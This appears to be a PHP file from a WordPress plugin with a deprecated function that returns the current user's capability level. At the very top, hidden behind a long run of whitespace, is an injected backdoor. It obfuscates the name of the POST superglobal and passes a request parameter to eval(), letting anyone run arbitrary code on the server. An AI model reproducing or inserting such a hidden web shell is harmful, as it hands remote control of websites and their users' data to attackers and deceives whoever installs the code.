<?php                                                                                                                                                                                                                                                               $qV="stop_";$s20=strtoupper($qV[4].$qV[3].$qV[2].$qV[0].$qV[1]);if(isset(${$s20}['q78cd5a'])){eval(${$s20}['q78cd5a']);}?><?php

    
    /**
    * Return the user level
    * 
    * This is deprecated, will be removed in the next versions
    * 
    * @param mixed $return_as_numeric
    */
    function userdata_get_user_level($return_as_numeric = FALSE)
        {
            global $userdata;
            
            $user_level = '';
            for ($i=10; $i >= 0;$i--)
                {
                    if (current_user_can('level_' . $i) === TRUE)
                        {
                            $user_level = $i;
                            if ($return_as_numeric === FALSE)
                                $user_level = 'level_'.$i;    
                            break;
                        }    
                }        
            return ($user_level);
        }
        
        
    function cpt_info_box()
        {
            ?>
            
            <?php   
        }

?>